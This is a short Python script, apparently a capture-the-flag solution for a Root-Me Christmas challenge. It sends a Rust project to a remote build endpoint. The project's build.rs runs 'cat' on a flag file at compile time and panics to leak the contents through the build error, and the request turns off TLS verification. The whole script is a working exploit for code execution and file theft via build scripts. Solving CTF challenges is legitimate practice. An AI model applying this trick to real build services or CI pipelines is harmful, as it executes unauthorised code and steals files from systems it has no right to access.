import requests

data = { 'build.rs' : 'use std::process::{Command, Stdio}; fn main() { let output = Command::new("cat").args(&["/flag/randomflaglolilolbigbisous.txt"]).stdout(Stdio::piped()).output().unwrap(); panic!("{}", String::from_utf8(output.stdout).unwrap()); }', 'src/main.rs' : 'fn main() { println!("Hello, world!"); }' }

r = requests.post("https://day4.challenges.xmas.root-me.org/remote-build", json=data, verify=False)

print(r.content.decode())
